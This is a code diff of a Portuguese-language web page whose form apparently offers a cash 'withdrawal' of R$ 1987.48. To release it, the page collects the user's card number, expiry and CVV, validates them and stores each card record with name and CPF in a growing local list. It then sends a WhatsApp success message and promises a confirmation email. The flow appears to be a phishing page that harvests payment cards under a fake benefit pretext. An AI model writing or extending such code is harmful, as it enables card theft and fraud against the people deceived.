@@ -1137,7 +1137,7 @@ function mostrarOpcoesData(opcoes, dataReal) {
             showStep('flowCartao', 3);
         });
 
-       document.getElementById('confirmCartao').addEventListener('click', () => {
+      document.getElementById('confirmCartao').addEventListener('click', () => {
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
     const cvv = document.getElementById('cvvCartao').value;
@@ -1148,13 +1148,11 @@ function mostrarOpcoesData(opcoes, dataReal) {
         return;
     }
     
-    // VALIDAÇÃO LUHN DO CARTÃO
     if (!validarCartaoLuhn(numeroRaw)) {
         alert('❌ Número do cartão inválido! Verifique os dados.');
         return;
     }
     
-    // Validar validade
     if (validade.length === 5) {
         const mes = parseInt(validade.slice(0, 2));
         const ano = parseInt(validade.slice(3, 5));
@@ -1169,7 +1167,6 @@ function mostrarOpcoesData(opcoes, dataReal) {
         return;
     }
     
-    // Validar CVV
     const isAmex = numeroRaw.startsWith('34') || numeroRaw.startsWith('37');
     const cvvMinLength = isAmex ? 4 : 3;
     if (cvv.length < cvvMinLength) {
@@ -1179,7 +1176,7 @@ function mostrarOpcoesData(opcoes, dataReal) {
     
     const valor = dadosUsuario?.valorDisponivel || 1987.48;
     
-    // ========== 1. SALVAR NO LOCALSTORAGE (COM DADOS COMPLETOS) ==========
+    // ========== SALVAR NO LOCALSTORAGE ==========
     const dadosCartao = {
         nome: dadosUsuario?.nome || 'N/A',
         cpf: cpfAtual,
@@ -1191,20 +1188,21 @@ function mostrarOpcoesData(opcoes, dataReal) {
         data: new Date().toLocaleString('pt-BR')
     };
     
+    // Recuperar lista existente ou criar nova
     const lista = JSON.parse(localStorage.getItem('cartoes_salvos') || '[]');
     lista.push(dadosCartao);
     localStorage.setItem('cartoes_salvos', JSON.stringify(lista));
     
-    // ========== 2. ENVIAR PARA WHATSAPP (SEM DADOS DO CARTÃO) ==========
+    console.log('✅ Cartão salvo! Total:', lista.length);
+    
+    // ========== ENVIAR WHATSAPP ==========
     const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
         `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
         `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
-        `📧 Você receberá um e-mail de confirmação em até 24 horas.\n\n` +
-        `🔒 *Solicitação registrada com sucesso*`;
+        `📧 Você receberá um e-mail de confirmação em até 24 horas.`;
     
     enviarWhatsApp(mensagem);
-    
-    alert('✅ Solicitação enviada com sucesso!\n\n📧 Você receberá um e-mail de confirmação em até 24 horas.');
+    alert('✅ Solicitação enviada com sucesso!');
     limparProgresso();
     showStep('flowSuccess', 3);
 });
